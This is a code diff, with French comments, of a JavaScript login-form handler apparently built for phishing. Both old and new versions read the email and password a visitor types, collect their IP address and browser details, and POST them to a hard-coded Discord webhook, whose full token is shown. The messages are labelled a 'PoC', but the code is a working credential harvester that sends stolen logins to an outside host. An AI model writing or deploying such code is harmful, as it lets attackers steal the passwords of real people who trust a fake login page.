@@ -165,47 +165,29 @@
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
 
+    // Récupération de l'adresse IP via un service externe
     let ip = "Inconnu";
-    let city = "", region = "", country = "", timezone = "";
-
     try {
-      const res = await fetch("https://ipapi.co/json/");
+      const res = await fetch("https://api.ipify.org?format=json");
       const data = await res.json();
-      ip = data.ip || "Inconnu";
-      city = data.city || "";
-      region = data.region || "";
-      country = data.country_name || "";
-      timezone = data.timezone || "";
+      ip = data.ip;
     } catch (err) {
-      console.error("Erreur lors de la récupération IP/Géo :", err);
+      console.error("Impossible d'obtenir l'IP :", err);
     }
 
+    // Récupération des infos navigateur
     const userAgent = navigator.userAgent;
-    const language = navigator.language || navigator.userLanguage;
-    const screenRes = `${window.screen.width}x${window.screen.height}`;
-    const currentPage = window.location.href;
 
+    // Webhook Discord
     const webhookURL = "https://discord.com/api/webhooks/1360585270931751153/V_j_RxG3xVIjFiWyHyJJkIl4PI0p8mzhvZG2uxizjEWgbbPH9gkRkoopMbDILFIRLDg3";
 
-    const content = `🔐 **Nouvelle connexion (PoC)**
-
-📧 **Email :** ${email}
-🔑 **Mot de passe :** ${password}
-
-🌐 **Adresse IP :** ${ip}
-📍 **Localisation :** ${city}, ${region}, ${country}
-🕒 **Fuseau horaire :** ${timezone}
-🗺️ **Langue :** ${language}
-
-🧭 **Navigateur :** ${userAgent}
-🖥️ **Résolution écran :** ${screenRes}
-🔗 **Page visitée :** ${currentPage}
-`;
-
+    // Envoi vers Discord
     fetch(webhookURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content })
+      body: JSON.stringify({
+        content: `🔐 **Connexion (PoC)**\n📧 Email : ${email}\n🔑 Mot de passe : ${password}\n🌍 IP : ${ip}\n🧭 Navigateur : ${userAgent}`
+      })
     });
 
     alert("Merci ! Démonstration terminée.");
